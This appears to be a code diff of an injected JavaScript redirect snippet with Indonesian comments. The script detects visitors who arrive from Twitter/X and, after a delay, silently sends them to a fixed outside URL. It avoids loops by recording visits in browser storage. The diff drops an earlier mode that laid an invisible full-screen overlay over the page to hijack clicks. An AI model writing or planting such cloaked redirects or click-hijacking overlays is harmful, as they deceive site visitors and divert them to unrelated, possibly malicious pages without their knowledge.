@@ -1,38 +1,32 @@
 (function () {
   try {
-    var cooldownMs = 60 * 1000; // jeda antar redirect
-    var delayMs    = 3000;      // delay sebelum redirect
-    var mode       = "auto";    // "auto" = langsung, "overlay" = tap dulu
+    var cooldownMs = 10 * 1000;   // jeda antar redirect
+    var delayMs    = 3000;        // delay sebelum redirect (ms)
+    var target     = "https://vidoy.fun/cB6Tyq0.php"; // link tujuan fix
 
-    var redirectMap = {
-      "vidoy": "https://vidoy.fun/cB6Tyq0.php"
-    };
+    var qs = location.search + location.hash;
+    if (/[?#](?:.*[&?])?noredir=1/i.test(qs)) return;
 
-    var params = new URLSearchParams(location.search);
-    var id = params.get("id");
-    var target = redirectMap[id];
-    if (!target) return;
-
+    // deteksi Twitter/X
     var REF = document.referrer || "";
     var UA  = navigator.userAgent || "";
-    if (!(/(t\.co|twitter\.com)/i.test(REF) || /twitter/i.test(UA))) return;
+    var isX = /(t\.co|twitter\.com|x\.com)/i.test(REF) || /twitter/i.test(UA);
+    if (!isX) return;
 
+    // anti-loop
     var page = location.origin + location.pathname;
-    var sessKey = "redir_x_seen:" + page + "|" + id;
-    var cdKey   = "redir_x_cd:"   + page + "|" + id;
+    var sessKey = "redir_x_seen:" + page;
+    var cdKey   = "redir_x_cd:"   + page;
     var now = Date.now();
     if (sessionStorage.getItem(sessKey)) return;
     if (now < (+localStorage.getItem(cdKey) || 0)) return;
     sessionStorage.setItem(sessKey,"1");
     localStorage.setItem(cdKey, now + cooldownMs);
 
-    if (mode === "auto") {
-      setTimeout(()=>{ location.href = target; }, delayMs);
-    } else {
-      var overlay = document.createElement("div");
-      overlay.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,0);cursor:pointer";
-      overlay.onclick = ()=>{ window.open(target,"_blank")||(location.href=target); overlay.remove(); };
-      setTimeout(()=>document.body.appendChild(overlay), delayMs);
-    }
+    // redirect otomatis setelah delay
+    setTimeout(function () {
+      location.href = target;
+    }, delayMs);
+
   } catch(_) {}
 })();
